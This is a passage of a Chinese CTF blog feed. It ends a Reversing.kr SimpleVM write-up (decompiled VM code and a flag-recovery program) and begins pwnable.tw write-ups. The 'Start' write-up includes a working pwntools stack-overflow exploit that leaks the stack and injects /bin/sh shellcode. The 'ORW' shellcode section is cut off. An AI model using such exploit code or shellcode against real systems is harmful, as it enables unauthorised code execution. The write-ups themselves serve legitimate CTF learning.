<span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        sub_8048C22();</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>好吧，我承认非常麻烦，但是既然是SimpleVM，复杂度肯定没有那么高，由于硬看代码对于我来说太难了，而ida的动态调试又没有那么的舒服，通过查看这几个函数，发现只有一些运算而已，所以我果断把这些函数统统f5，而涉及内存的又只有write过来的804b0a0中的200个字节，我把这200个字节在内存中dump下来存成一个文件，之后我们所有的相关代码都拷贝到一个cpp里面，利用visual studio进行一个动态的调试。（f5太强大，没办法= =）</p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>有了原生可调式的cpp，还有什么比这更爽的事情，我们开始，断点在sub_8048A48();函数上面（我把它在代码中取名叫做password_flag_change()），然后我们将那200个字节c_804B0A0放入监视器中不断的监视它的变化。</p><p>Reversing.kr题目之SimpleVM详解</p><p>然后我们一步一步跟进。跟进的时候我们发现了非常关键的一个判断在如下函数中：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048B31</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_8048A48();</span><br><span class="line">  sub_8048A0B();</span><br><span class="line">  dword_804B198 = dword_804B190;</span><br><span class="line">  sub_8048A48();</span><br><span class="line">  sub_8048A0B();</span><br><span class="line">  dword_804B194 = dword_804B190;</span><br><span class="line">  dword_804B198 = dword_804B198 == dword_804B190;</span><br><span class="line">  dword_804B190 = <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_8048A2F();</span><br><span class="line">&#125;</span><br><span class="line">dword_804B198 = dword_804B198 == dword_804B190;</span><br></pre></td></tr></table></figure></p><p>这是一个是否相等的判断，它决定了dword_804B198是0还是1，所以跟踪dword_804B198和 dword_804B190两个变量的值是非常关键的一步。好了，有了跟踪的目标就非常轻松了，我们重新跟进，去寻找dword_804B198和dword_804B190的两个变量值的变化。在sub_8048A48()中，如下代码被执行了非常多次</p><pre><code>password_flag = (unsigned __int8)(*(c_804B0A0 + (c_804B0A0[9] ^ 0x10)) ^ 0x10);v0 = (c_804B0A0[9] ^ 0x10) + 1;result = v0 ^ 0x10;c_804B0A0[9] = v0 ^ 0x10;return result;</code></pre><p>监视一下 (c_804B0A0[9] ^ 0×10)，发现它从10开始不断往上涨，而password_flag 的值等于c_804B0A0[c_804B0A0[9] ^ 0×10] ^ 0×10 ，所以我们观察c_804B0A0[10] 到c_804B0A0[199]，发现它比较有规律。我们断点直接设在</p><p>dword_804B198 = dword_804B198 == dword_804B190;<br>这句话上。发现dword_804B190 = 9，dword_804B198 = 81。所以只要我们注意这两个值从哪儿来的就可以了，重新步进。发现如下过程：</p><p>dword_804B190= (unsigned <strong>int8)(*(c_804B0A0 + (c_804B0A0[9] ^ 0x10)) ^ 0x10);//这句话在c_804B0A0[9] ^ 0x10 = 18时候dword_804B190为 =c_804B0A0[18]^0x10 = 96<br>…<br>dword_804B194= dword_804B190;;//之后通过这句话又将96存到dword_804B194中<br>…<br>v0 = c_804B0A0[dword_804B190] ^ 0x10;<br>dword_804B190= v0;//又通过这两句句话将c_804B0A0[0]也就是flag的第一位取出来放到dword_804B190中<br>···<br>dword_804B190^= dword_804B194;//接着又与dword_804B194异或，dword_804B194为刚开始的96，最终dword_804B190将得到81<br>···<br>dword_804B190= (unsigned </strong>int8)(*(c_804B0A0 + (c_804B0A0[9] ^ 0x10)) ^ 0x10);//这句话在c_804B0A0[9] ^ 0x10 = 24时候dword_804B190为 =c_804B0A0[18]^0x10 = 9<br>之后的代码不逐一分析，功能是将81和9分别存在了c_804B0A0[0]和c_804B0A0[7]上（这里可以确定flag只需要7个字节就可以了），最后在</p><p> dword_804B198 = dword_804B198 == dword_804B190;<br>这句话中将其取出，分别赋值dword_804B198和dword_804B190。</p><p>我们整理一下，可以得出要使得dword_804B198和dword_804B190相等，那么就是c_804B0A0[9] ^ 0×10 = 18和c_804B0A0[9] ^ 0×10 = 24的时候</p><p>即</p><p>c_804B0A0[18] ^ flag[0] == c_804B0A0[24];<br>好了，flag出来了，按照这个思路，我们可以逐步的跟踪到flag[1],flag[2]等于哪两个字符的异或了。</p><p>我们写出以下的代码来得到flag：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%c%c%c%c%c%c%c"</span>, c_804B0A0[<span class="number">18</span>] ^ c_804B0A0[<span class="number">24</span>], c_804B0A0[<span class="number">32</span>] ^ c_804B0A0[<span class="number">38</span>], c_804B0A0[<span class="number">46</span>] ^ c_804B0A0[<span class="number">52</span>], c_804B0A0[<span class="number">60</span>] ^ c_804B0A0[<span class="number">66</span>], c_804B0A0[<span class="number">74</span>] ^ c_804B0A0[<span class="number">80</span>], c_804B0A0[<span class="number">88</span>] ^ c_804B0A0[<span class="number">94</span>], c_804B0A0[<span class="number">102</span>] ^ c_804B0A0[<span class="number">108</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>总结<br>做VM还是比较耗费时间的，虽然名为SimpleVM，额，还是要花一定的时间去慢慢了解这个机制是怎么样的，所以的话，逆向还是需要耐心的。最后贴一下我用的c代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"string.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> password_flag = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> result;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>  c_804B0A0[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> int_198;</span><br><span class="line"><span class="keyword">int</span> int_194;</span><br><span class="line"><span class="keyword">int</span> int_18c;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A92</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v0; <span class="comment">// ST0F_1</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">    v0 = password_flag + (c_804B0A0[<span class="number">10</span>] ^ <span class="number">0x10</span>);</span><br><span class="line">    result = v0 ^ <span class="number">0x10</span>;</span><br><span class="line">    c_804B0A0[<span class="number">9</span>] = v0 ^ <span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048A2F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">    result = password_flag;</span><br><span class="line">    c_804B0A0[password_flag] = int_198 ^ <span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">password_flag_change</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v0; <span class="comment">// ST0F_1</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">    password_flag = (<span class="keyword">unsigned</span> __int8)(*(c_804B0A0 + (c_804B0A0[<span class="number">9</span>] ^ <span class="number">0x10</span>)) ^ <span class="number">0x10</span>);</span><br><span class="line">    v0 = (c_804B0A0[<span class="number">9</span>] ^ <span class="number">0x10</span>) + <span class="number">1</span>;</span><br><span class="line">    result = v0 ^ <span class="number">0x10</span>;</span><br><span class="line">    c_804B0A0[<span class="number">9</span>] = v0 ^ <span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">password_flag_change2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v0; <span class="comment">// ST0F_1</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">    v0 = c_804B0A0[password_flag] ^ <span class="number">0x10</span>;</span><br><span class="line">    result = v0;</span><br><span class="line">    password_flag = v0;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    password_flag_change();</span><br><span class="line">    int_198 = password_flag;</span><br><span class="line">    password_flag_change();</span><br><span class="line">    int_194 = password_flag;</span><br><span class="line">    password_flag = int_198;</span><br><span class="line">    int_198 = int_194;</span><br><span class="line">    <span class="keyword">return</span> sub_8048A2F();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    int_198 = password_flag;</span><br><span class="line">    int_18c = int_194;</span><br><span class="line">    password_flag_change();</span><br><span class="line">    int_18c = password_flag;</span><br><span class="line">    password_flag_change();</span><br><span class="line">    password_flag_change2();</span><br><span class="line">    int_194 = password_flag;</span><br><span class="line">    password_flag = int_18c;</span><br><span class="line">    password_flag_change2();</span><br><span class="line">    password_flag ^= int_194;</span><br><span class="line">    int_198 = password_flag;</span><br><span class="line">    password_flag = int_18c;</span><br><span class="line">    <span class="keyword">return</span> sub_8048A2F();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    password_flag_change();</span><br><span class="line">    password_flag_change2();</span><br><span class="line">    int_198 = password_flag;</span><br><span class="line">    password_flag_change();</span><br><span class="line">    password_flag_change2();</span><br><span class="line">    int_194 = password_flag;</span><br><span class="line">    int_198 = int_198 == password_flag;</span><br><span class="line">    password_flag = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">return</span> sub_8048A2F();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">    int_198 = password_flag;</span><br><span class="line">    password_flag_change();</span><br><span class="line">    int_198 = password_flag;</span><br><span class="line">    password_flag = <span class="number">8</span>;</span><br><span class="line">    password_flag_change2();</span><br><span class="line">    result = password_flag;</span><br><span class="line">    <span class="keyword">if</span> (!password_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        password_flag = int_198;</span><br><span class="line">        result = sub_8048A92();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    password_flag_change();</span><br><span class="line">    <span class="keyword">return</span> sub_8048A92();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">    password_flag = <span class="number">0</span>;</span><br><span class="line">    password_flag_change2();</span><br><span class="line">    int_198 = password_flag;</span><br><span class="line">    password_flag = <span class="number">1</span>;</span><br><span class="line">    password_flag_change2();</span><br><span class="line">    int_194 = password_flag;</span><br><span class="line">    password_flag = int_198;</span><br><span class="line">    result = int_194;</span><br><span class="line">    int_198 = int_194;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    FILE *file = fopen(<span class="string">"E://ctf//reversingkr//17//dumped"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        c_804B0A0[i] = fgetc(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i)</span><br><span class="line">        c_804B0A0[i] ^= <span class="number">0x20</span>u;</span><br><span class="line"></span><br><span class="line">    c_804B0A0[<span class="number">0</span>] = <span class="string">'1'</span>;</span><br><span class="line">    c_804B0A0[<span class="number">1</span>] = <span class="string">'2'</span>;</span><br><span class="line">    c_804B0A0[<span class="number">2</span>] = <span class="string">'3'</span>;</span><br><span class="line">    c_804B0A0[<span class="number">3</span>] = <span class="string">'4'</span>;</span><br><span class="line">    c_804B0A0[<span class="number">4</span>] = <span class="string">'5'</span>;</span><br><span class="line">    c_804B0A0[<span class="number">5</span>] = <span class="string">'6'</span>;</span><br><span class="line">    c_804B0A0[<span class="number">6</span>] = <span class="string">'7'</span>;</span><br><span class="line">    c_804B0A0[<span class="number">6</span>] = <span class="string">'8'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">199</span>; ++i)</span><br><span class="line">        c_804B0A0[i] ^= <span class="number">0x10</span>u;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c%c%c%c%c%c%c"</span>, c_804B0A0[<span class="number">18</span>] ^ c_804B0A0[<span class="number">24</span>], c_804B0A0[<span class="number">32</span>] ^ c_804B0A0[<span class="number">38</span>], c_804B0A0[<span class="number">46</span>] ^ c_804B0A0[<span class="number">52</span>], c_804B0A0[<span class="number">60</span>] ^ c_804B0A0[<span class="number">66</span>], c_804B0A0[<span class="number">74</span>] ^ c_804B0A0[<span class="number">80</span>], c_804B0A0[<span class="number">88</span>] ^ c_804B0A0[<span class="number">94</span>], c_804B0A0[<span class="number">102</span>] ^ c_804B0A0[<span class="number">108</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        password_flag_change();</span><br><span class="line">        <span class="keyword">switch</span> (password_flag)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            func1();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            func2();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            func3();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            func4();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            func5();</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            func6();</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            result = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (password_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Correct!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Wrong!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;p&gt;逆向还是很好玩的，这个reversing.kr的韩国网站，题目还是很有质量的，过年接近一个月，每天做几道题目还是比较舒服的，做着做着也就还剩
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pwnable.tw-writeup</title>
    <link href="https://foyjog.github.io/2018/03/08/pwnable-tw-writeup/"/>
    <id>https://foyjog.github.io/2018/03/08/pwnable-tw-writeup/</id>
    <published>2018-03-08T03:59:49.000Z</published>
    <updated>2018-07-03T08:18:38.501Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>新手学习就是要多见识，多做题是长见识的好方法，本文将持续更新pwnable.tw的writeup，记录学习二进制的路程。</p><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>基础题目，拿过来进行分析，拖入ida，发现代码不多<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">                               push    esp</span><br><span class="line">.text:<span class="number">08048061</span>                 push    offset _exit</span><br><span class="line">.text:<span class="number">08048066</span>                 xor     eax, eax</span><br><span class="line">.text:<span class="number">08048068</span>                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">0804806</span>A                 xor     ecx, ecx</span><br><span class="line">.text:<span class="number">0804806</span>C                 xor     edx, edx</span><br><span class="line">.text:<span class="number">0804806</span>E                 push    <span class="number">3</span>A465443h</span><br><span class="line">.text:<span class="number">08048073</span>                 push    <span class="number">20656874</span>h</span><br><span class="line">.text:<span class="number">08048078</span>                 push    <span class="number">20747261</span>h        </span><br><span class="line">.text:<span class="number">0804807</span>D                 push    <span class="number">74732073</span>h</span><br><span class="line">.text:<span class="number">08048082</span>                 push    <span class="number">2774654</span>Ch       ; Lets start the ctf!</span><br><span class="line">.text:<span class="number">08048087</span>                 mov     ecx, esp        ; addr</span><br><span class="line">.text:<span class="number">08048089</span>                 mov     dl, <span class="number">14</span>h         ; len</span><br><span class="line">.text:<span class="number">0804808B</span>                 mov     bl, <span class="number">1</span>           ; fd</span><br><span class="line">.text:<span class="number">0804808</span>D                 mov     al, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804808F</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">08048091</span>                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">08048093</span>                 mov     dl, <span class="number">3</span>Ch</span><br><span class="line">.text:<span class="number">08048095</span>                 mov     al, <span class="number">3</span></span><br><span class="line">.text:<span class="number">08048097</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX - sys_read</span><br><span class="line">.text:<span class="number">08048099</span>                 add     esp, <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0804809</span>C                 retn</span><br></pre></td></tr></table></figure></p><p>看出sys_read有溢出，所以做最基本的栈溢出即可。<br>用checksec查看一下程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>没有任何保护，直接放shellcode上去，栈上执行。<br>泄露栈地址可以由0x08048087控制，将esp的地址重新打印即可 ，python脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line">s= process(<span class="string">"calc"</span>)</span><br><span class="line">elf = ELF(<span class="string">"calc"</span>)</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line">movecxesp = <span class="number">0x8048087</span></span><br><span class="line">hex1 = <span class="number">0xff9203e0</span> <span class="comment">####</span></span><br><span class="line">hex2 = <span class="number">0xff9203dc</span> <span class="comment">####这两个地址是随机的一次调试获得的，目的是为了计算差值</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">20</span>+ p32(movecxesp)</span><br><span class="line">pdb.set_trace()</span><br><span class="line"><span class="keyword">print</span> s.recv()</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">esp =  u32(s.recv(<span class="number">4</span>)) -(hex1 - hex2)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">20</span> + p32(esp+<span class="number">20</span>+<span class="number">4</span>)+shellcode</span><br><span class="line">s.recv()</span><br><span class="line">s.send(payload2)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>看题目意思Only open read write syscall are allowed to use.那么我们使用open + read + write来进行flag的获取。<br>从网站<a href="https://elixir.bootlin.com/linux/v3.0/ident/sys_open" target="_blank" rel="noopener">bootlin</a>去查内部调用的函数方式，再从linux系统调用表中去查看调用方法，即可编写出汇编代码，再转化为shellcode即可。<br>linux系统调用表的链接如下：<a href="https://pan.baidu.com/s/1MU9ynK3nrRfUmsGe3pSgOw" target="_blank" rel="noopener">网盘链接</a><br>编写的asm汇编代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span> (<span class="string">"push $0x00006761 